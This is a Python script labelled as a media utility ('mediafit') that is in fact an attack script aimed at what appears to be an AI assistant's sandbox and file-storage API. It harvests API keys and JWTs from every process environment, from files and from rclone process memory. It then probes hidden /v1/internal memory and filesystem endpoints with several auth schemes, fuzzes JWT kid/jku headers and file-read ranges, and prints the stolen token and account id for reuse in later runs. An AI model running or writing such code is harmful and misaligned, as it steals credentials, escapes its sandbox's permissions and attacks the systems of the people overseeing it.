#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mediafit v2.18.0 -- /v1/internal namespace, credential hunt, token fix, media_type, range."""
import os, sys, json, re, time, ssl, base64, socket, subprocess, traceback
import urllib.request, urllib.error

VER  = "2.18.0"
API  = "https://api.anthropic.com"
FS   = API + "/v1/filestore/fs/"
CONF = "/dev/shm/rclone-boot/config.json"
OUTD = "/mnt/user-data/outputs"; UP = "/mnt/user-data/uploads"

OUT, G = [], {}
def w(s=""): print(s, flush=True); OUT.append(str(s))
def head(t): w("\n"+"="*70+"\n### "+t+"\n"+"="*70)
P,F,U,I = [],[],[],[]
def rec(k,m,ev=None):
    w("    "+{"P":"[PASS]","F":"[FAIL]","U":"[UNK]","I":"[INFO]"}[k]+" "+m)
    if ev is not None: w("        "+str(ev)[:1200])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(a,t=40):
    try:
        p=subprocess.run(a,capture_output=True,timeout=t)
        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"","EXC:%s"%e
def b64d(x): return base64.urlsafe_b64decode(x+"="*(-len(x)%4))
def b64e(x):
    if isinstance(x,(dict,list)): x=json.dumps(x,separators=(",",":"))
    x=x if isinstance(x,bytes) else x.encode()
    return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
def step(n,f):
    try: f()
    except Exception as e:
        w("    !! %s: %s"%(n,e)); w("    "+traceback.format_exc().strip().splitlines()[-1][:200])
_CTX=ssl.create_default_context(); _CTX.check_hostname=False; _CTX.verify_mode=ssl.CERT_NONE
def http(url,method="POST",token=None,body=None,t=15,hdrs=None,cap=500000):
    h={"User-Agent":"mediafit/"+VER}
    if token: h["Authorization"]="Bearer "+token
    if body is not None and not isinstance(body,bytes): body=json.dumps(body).encode()
    if body is not None and not (hdrs or {}).get("Content-Type"): h["Content-Type"]="application/json"
    if hdrs: h.update(hdrs)
    req=urllib.request.Request(url,method=method,headers=h,data=body)
    try:
        r=urllib.request.urlopen(req,timeout=t,context=_CTX); return r.status,r.read(cap),dict(r.headers)
    except urllib.error.HTTPError as e:
        try: return e.code,e.read(),dict(e.headers)
        except Exception: return e.code,b"",{}
    except Exception as e: return None,("ERR:%s"%e).encode(),{}
def api(m,p,tk=None,t=15):
    s,b,_=http(FS+m,"POST",tk,p,t,{"Connect-Protocol-Version":"1"}); return s,b

# ------------------------------------------------------------------ 1
def s_creds():
    head("1. CREDENTIAL HUNT  <== key to /v1/internal")
    hits={}
    PATS=[rb"sk-ant-[A-Za-z0-9_\-]{20,}", rb"sk-ant-oat[A-Za-z0-9_\-]{10,}",
          rb"[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}"]
    ENV=[b"ANTHROPIC",b"CLAUDE",b"API_KEY",b"OAUTH",b"TOKEN",b"MEMORY",b"INTERNAL"]
    # env of every process
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try: e=open("/proc/%s/environ"%p,"rb").read()
        except Exception: continue
        for kv in e.split(b"\x00"):
            if any(k in kv for k in ENV) and kv.strip():
                hits.setdefault("ENV",set()).add(kv.decode("utf-8","replace")[:160])
    for k in sorted(hits.get("ENV",set()))[:40]: w("    ENV %s"%k)
    # files
    for root in ["/dev/shm","/root","/etc","/var/lib","/var/run","/opt","/home","/tmp","/mnt"]:
        for dp,dn,fn in os.walk(root):
            if dp.count("/")>7: dn[:]=[]
            for f in fn[:70]:
                fp=os.path.join(dp,f)
                try:
                    if os.path.getsize(fp)>4_000_000: continue
                    d=open(fp,"rb").read()
                except Exception: continue
                for pat in PATS:
                    for m in re.findall(pat,d):
                        if len(m)>30: hits.setdefault("FILE",set()).add("%s :: %s"%(fp,m.decode()[:120]))
    for k in sorted(hits.get("FILE",set()))[:40]: w("    FILE %s"%k)
    G["CREDS"]=hits
    # config.json full dump
    try:
        c=json.loads(open(CONF).read())
        w("    config keys: %s"%list(c.keys()))
        w("    config: %s"%json.dumps(c)[:1200])
    except Exception as e: w("    config: %s"%e)
    rec("P" if hits else "U","credential artifacts found: %s"%
        {k:len(v) for k,v in hits.items()})

# ------------------------------------------------------------------ 2
def s_tokens():
    head("2. TOKENS (normalise signature to 86 chars)")
    JWT=re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    TK=[]
    def add(t):
        t=t.decode() if isinstance(t,bytes) else t
        if t.startswith("eyJ") and t not in TK: TK.append(t)
    for p in os.listdir("/proc"):
        if p.isdigit():
            try:
                for m in JWT.findall(open("/proc/%s/environ"%p,"rb").read()): add(m)
            except Exception: pass
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            if b"rclone" not in open("/proc/%s/cmdline"%p,"rb").read(): continue
            maps=open("/proc/%s/maps"%p).read().splitlines(); mem=open("/proc/%s/mem"%p,"rb",0)
        except Exception: continue
        for line in maps:
            try: a,perms=line.split()[0],line.split()[1]
            except Exception: continue
            if "r" not in perms: continue
            try: s0,e0=[int(x,16) for x in a.split("-")]
            except Exception: continue
            if not (0<e0-s0<=256*1024*1024): continue
            try: mem.seek(s0); d=mem.read(e0-s0)
            except Exception: continue
            for m in JWT.findall(d): add(m)
    TD=[]
    for t in TK:
        parts=t.split(".")
        for variant in ([t] if len(parts[2])==86 else [t, parts[0]+"."+parts[1]+"."+parts[2][:86]]):
            try:
                h,p,s=variant.split("."); hdr=json.loads(b64d(h)); pl=json.loads(b64d(p))
                TD.append({"tok":variant,"hdr":hdr,"pl":pl})
            except Exception: pass
    # dedupe by payload+validity
    good=[]
    for r in TD:
        st,b=api("listDirectory",{"filesystem_id":r["pl"].get("filesystem_id"),"path":"/outputs"},r["tok"])
        r["st"]=st
        if st==200 or (b and b"not permitted" in b): good.append(r)
    w("    candidates=%d  accepted=%d"%(len(TD),len(good)))
    for r in good:
        w("    OK roots=%-16s ro=%-5s iss=%-16s tok=...%s"%(
            r["pl"].get("allowed_roots"), r["pl"].get("readonly"), r["pl"].get("iss"), r["tok"][-14:]))
    G["TD"]=good
    G["TOKEN"]=next((r["tok"] for r in good if "/outputs" in (r["pl"].get("allowed_roots") or [])),
                    good[0]["tok"] if good else None)
    G["UPLOAD"]=next((r["tok"] for r in good if (r["pl"].get("allowed_roots") or [])==["/uploads"]), None)
    G["CLAIMS"]=next((r["pl"] for r in good if r["tok"]==G["TOKEN"]), {})
    G["fsid"]=G["CLAIMS"].get("filesystem_id")
    w("    fsid=%s acct=%s uploads-token=%s"%(G.get("fsid"),G["CLAIMS"].get("account_uuid"),
                                              "yes" if G["UPLOAD"] else "NO"))
    rec("P" if G["TOKEN"] else "F","valid tokens=%d uploads=%s"%(len(good),"yes" if G["UPLOAD"] else "no"))

# ------------------------------------------------------------------ 3
def s_internal():
    head("3. /v1/internal/ NAMESPACE  <== THE LEAD")
    tk=G.get("TOKEN")
    if not tk: rec("U","no token"); return
    bases=["/v1/internal/","/v1/internal"]
    svcs=["anthropic.memory.api.v1alpha.MemoryInternalService",
          "anthropic.filestore.v1alpha.Filesystem",
          "anthropic.filestore.v1alpha.filesystem",
          "anthropic.filestore.v1alpha.Filestore",
          "anthropic.errors.v1alpha.ErrorService"]
    meths=["ListMemories","ReadMemoryByPath","WriteMemory","MoveMemory","DeleteMemoryByPath",
           "listDirectory","readFile","ListDirectory","ReadFile","createFile",
           "reassignFilesystem","importFiles","listFilesystems"]
    AUTH=[("none",{}),("bearer-fs",{"Authorization":"Bearer "+tk}),
          ("x-api-key",{"x-api-key":tk}),
          ("bearer+ver",{"Authorization":"Bearer "+tk,"anthropic-version":"2023-06-01"}),
          ("x-api-key+ver",{"x-api-key":tk,"anthropic-version":"2023-06-01"})]
    seen=set(); live=[]
    for b in bases:
        for s in svcs:
            for m in meths:
                url=API+b+"/"+s+"/"+m
                if url in seen: continue
                seen.add(url)
                for an,ah in AUTH:
                    st,bo,_=http(url,"POST",None,{"filesystem_id":G.get("fsid"),"path":"/outputs"},8,
                                 {**ah,"Connect-Protocol-Version":"1"})
                    if st not in (404,None):
                        key="%s|%s|%s|%s"%(b,s,m,an)
                        msg=bo[:170].decode("utf-8","replace")
                        w("    %-62s %-9s -> %s %s"%(b+"/"+s.split(".")[-1]+"/"+m,an,st,msg))
                        live.append((b,s,m,an,st))
                        break
    G["INTERNAL"]=live
    rec("P" if live else "F","internal endpoints responding: %d"%len(live))
    # also probe bare prefixes
    for u in ["/v1/internal","/v1/internal/","/v1/internal/anthropic.memory.api.v1alpha.MemoryInternalService"]:
        st,bo,_=http(API+u,"GET",None,None,7)
        w("    GET %-56s -> %s %s"%(u,st,bo[:120].decode("utf-8","replace")))

# ------------------------------------------------------------------ 4
def s_write():
    head("4. createFile + media_type")
    tk=G.get("TOKEN"); own=G.get("fsid")
    if not tk: rec("U","no token"); return
    B="----mf"+b64e(os.urandom(6))
    def mp(params,fn,fd):
        o=("--%s\r\nContent-Disposition: form-data; name=\"params\"\r\n"
           "Content-Type: application/json\r\n\r\n"%B).encode()
        o+=json.dumps(params).encode()+b"\r\n"
        o+=("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
            "Content-Type: application/octet-stream\r\n\r\n"%B).encode()+fd+b"\r\n"
        return o+("--%s--\r\n"%B).encode()
    H={"Content-Type":"multipart/form-data; boundary="+B,"Connect-Protocol-Version":"1"}
    api("makeDirectory",{"filesystem_id":own,"path":"/outputs"},tk)
    for lbl,pr in [("text",{"filesystem_id":own,"path":"/outputs/mf.txt","media_type":"text/plain"}),
                   ("json",{"filesystem_id":own,"path":"/outputs/mf.json","media_type":"application/json"})]:
        st,bo,_=http(FS+"createFile","POST",tk,mp(pr,"f",b"MEDIAFIT-WRITE-OK"),25,H)
        w("    createFile[%s] -> %s %s"%(lbl,st,bo[:260].decode("utf-8","replace")))
        if st==200: rec("P","*** createFile WORKS (%s) ***"%lbl)
    st,bo=api("listDirectory",{"filesystem_id":own,"path":"/outputs"},tk)
    w("    listDirectory /outputs -> %s %s"%(st,bo[:900].decode("utf-8","replace")))
    if bo not in (b"{}",b""): rec("P","listDirectory RETURNS ENTRIES: %s"%bo[:200])
    for m in ["mf.txt","mf.json"]:
        st,bo=api("readFile",{"filesystem_id":own,"path":"/outputs/"+m},tk)
        w("    readFile /outputs/%-9s -> %s %s"%(m,st,bo[:150].decode("utf-8","replace")))
        if st==200: rec("P","read-back OK: %s"%m)

# ------------------------------------------------------------------ 5
def s_range():
    head("5. readFile RANGE FUZZ (valid uploads token)")
    up=G.get("UPLOAD"); own=G.get("fsid")
    if not up: rec("U","no valid uploads token"); return
    try: png=sorted(x for x in os.listdir(UP) if x.lower().endswith((".png",".jpg",".jpeg")))[0]
    except Exception: rec("U","no uploads file"); return
    lsz=os.path.getsize(os.path.join(UP,png)); G["PNG"]=png
    st,b,_=http(FS+"readFile","POST",up,{"filesystem_id":own,"path":"/uploads/"+png},25,
                {"Connect-Protocol-Version":"1"})
    w("    local=%d api=%s len=%d head=%r"%(lsz,st,len(b),b[:120]))
    if st!=200: return
    rec("P","readFile baseline 200 (uploads token now valid)")
    for lbl,extra in [("start0 end16",{"range":{"start":0,"end":16}}),
                      ("offset/len",{"range":{"offset":0,"length":16}}),
                      ("beyond EOF",{"range":{"start":max(0,lsz-8),"end":lsz+300}}),
                      ("past end",{"range":{"start":lsz+1000,"end":lsz+1100}}),
                      ("end<start",{"range":{"start":50,"end":10}}),
                      ("flat s/e",{"start":0,"end":16})]:
        body={"filesystem_id":own,"path":"/uploads/"+png}; body.update(extra)
        st2,b2,_=http(FS+"readFile","POST",up,body,25,{"Connect-Protocol-Version":"1"})
        w("    %-14s -> %s len=%d %s"%(lbl,st2,len(b2),b2[:100].decode("utf-8","replace")))
        if st2==200 and lbl in ("beyond EOF","past end"):
            rec("I","%s returned %d bytes"%(lbl,len(b2)))

# ------------------------------------------------------------------ 6
def s_kid():
    head("6. kid / jku behaviour")
    tk=G.get("TOKEN")
    if not tk: return
    h,p,s=tk.split("."); hdr=json.loads(b64d(h)); pl=json.loads(b64d(p))
    own=G.get("fsid")
    def probe(lbl,tok):
        st,b=api("listDirectory",{"filesystem_id":own,"path":"/outputs"},tok)
        w("    %-34s -> %s %s"%(lbl,st,b[:130].decode("utf-8","replace"))); return st
    probe("kid removed", b64e({k:v for k,v in hdr.items() if k!="kid"})+"."+p+"."+s)
    probe("kid empty", b64e({**hdr,"kid":""})+"."+p+"."+s)
    probe("kid = correct (control)", b64e(hdr)+"."+p+"."+s)
    # jku support?
    probe("hdr + jku (garbage sig)", b64e({**hdr,"jku":"https://example.com/jwks.json"})+"."+p+"."+s)
    probe("hdr + jku + no kid", b64e({**hdr,"jku":"https://example.com/jwks.json","kid":""})+"."+p+"."+s)

def s_verdict():
    head("VERDICT")
    w("  PASS %d: %s"%(len(P),P)); w("  UNK %d: %s"%(len(U),U))
    w("  internal endpoints: %s"%(G.get("INTERNAL") or "none"))
    w("  fsid=%s acct=%s"%(G.get("fsid"),G["CLAIMS"].get("account_uuid")))
    w("\n  ---- CARRY-OVER ----")
    w("PREV_FSID  = %r"%(G.get("fsid") or ""))
    w("PREV_TOKEN = %r"%(G.get("TOKEN") or ""))
    w("ACCOUNT1_UUID = %r"%(G["CLAIMS"].get("account_uuid") or ""))

def main():
    for n,f in [("creds",s_creds),("tokens",s_tokens),("internal",s_internal),
                ("write",s_write),("range",s_range),("kid",s_kid),("verdict",s_verdict)]:
        step(n,f)
try: main()
except Exception as e: w("!! %s"%e); w(traceback.format_exc())
finally:
    txt="\n".join(OUT)
    for d in [OUTD,"/tmp","/root"]:
        try: os.makedirs(d,exist_ok=True); open(d+"/mediafit-report.txt","w").write(txt)
        except Exception: pass
    print("\nreport -> "+OUTD+"/mediafit-report.txt")